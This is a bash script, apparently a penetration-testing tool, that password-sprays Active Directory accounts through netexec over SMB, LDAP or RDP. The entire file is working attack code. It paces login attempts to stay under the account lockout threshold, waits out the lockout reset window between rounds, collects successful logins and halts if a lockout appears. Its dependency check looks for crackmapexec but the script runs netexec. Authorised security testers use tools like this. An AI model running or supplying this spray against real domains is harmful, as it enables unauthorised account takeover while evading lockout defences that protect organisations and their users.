#!/bin/bash
# Password spray AD accounts with netexec according to reset counter and lockout threshold policies
# Author: (@kplei)

which crackmapexec > /dev/null 2>&1
if [ $? == 1 ]; then
    echo "Can't find netexec. This tool requires it."
    exit
fi

#read -p "Enter the 'Reset Account Lockout Counter After' value: " reset_counter
#read -p "Enter the 'Account Lockout Threshold' value: " lockout_threshold
#read -p "Enter the Domain Controller IP Address: " dc_ip
#read -p "Enter path to a password list: " passwords
#read -p "Enter path to domain users list: " dom_users


help() {
    echo "flags:"
    echo "-t: Target IP address or hostname"
    echo "-m: Protocol - can be SMB/LDAP/RDP"
    echo "-u: Username or username file"
    echo "-p: Password or password file"
    echo "-l: Account Lockout Threshold' value"
    echo "-r: 'Reset Account Lockout Counter After' value"
    echo "-n: 'Custom port number - optional"
    echo "-h: 'Print this help summary page"
    echo ""
    echo "Usage example:"
    echo "nxcspray-2.sh -t 10.1.1.1 -m smb -u ./users.txt -p ./passwords.txt -l 5 -r 30 -n 445"

}


while getopts t:m:r:l:p:u:n:h: flag
do
    case "${flag}" in
        t) dc_ip=${OPTARG};;
        m) method=${OPTARG};;
        r) reset_counter=${OPTARG};;
        l) lockout_threshold=${OPTARG};;
        u) dom_users=${OPTARG};;
        p) passwords=${OPTARG};;
        n) port=${OPTARG};;
        h) help ;;
        *) echo "Invalid option: -$flag" && echo "" && help && exit 1;;

    esac
done


if [[ -z $dc_ip  || -z $method || -z $reset_counter || -z $lockout_threshold ||  -z $dom_users ||  -z $passwords ]]
  then
    echo "ERROR: missing mandatory arguments";
    echo "";
    help;

    exit 1;
fi


cp $passwords $passwords.tmp

checkpwns () {
    cat nxcspray_output.txt | grep "[+]" 2>/dev/null
    if [ $? == 0 ]; then
        echo "[+] Successful logins:"
        cat nxcspray_output.txt | grep "[+]"
    else
        echo "[-] No successful logins."
    fi
    cat nxcspray_output.txt | grep "LOCKOUT" 2>/dev/null
    if [ $? == 0 ]; then
        echo "[!] LOCKOUT DETECTED. EXITING."
        exit
    fi
}

while true; do
    # number of passwords to try from the list; lockout_threshold - 1
    pass_num=$(head -n $(echo $((lockout_threshold-1))) $passwords.tmp)
    echo "[*] Trying $(echo $((lockout_threshold-1))) passwords every $(echo $((reset_counter+1))) minutes against $(echo $dc_ip) and using $(echo $passwords) and $(echo $dom_users) lists."
    sleep 3
    for password in $pass_num; do
        t2='date +"%T"'
        echo "[+] Running:" `$t2`
	if [[ -z $port ]] 
	  then 
            netexec $method $dc_ip -u $(cat $dom_users) -p $password 2>/dev/null | tee -a nxcspray_output.txt
	else
	    netexec $method $dc_ip -u $(cat $dom_users) -p $password --port $port 2>/dev/null | tee -a nxcspray_output.txt
	fi

    done
    # remove used passwords from the list
    sed -i -e "1,$((lockout_threshold-1))d" $passwords.tmp
    checkpwns
    
	t='date +"%T"'
	echo "[+] Waiting $(echo $((reset_counter+1))) minutes..."
	echo "[+] Last run:" `$t`
	

    timer=$((reset_counter+1))
    sleep $timer"m"
    if [[ ! -s $passwords.tmp ]]; then
        checkpwns
        echo "Done."
	rm $passwords.tmp
        exit
    fi
done
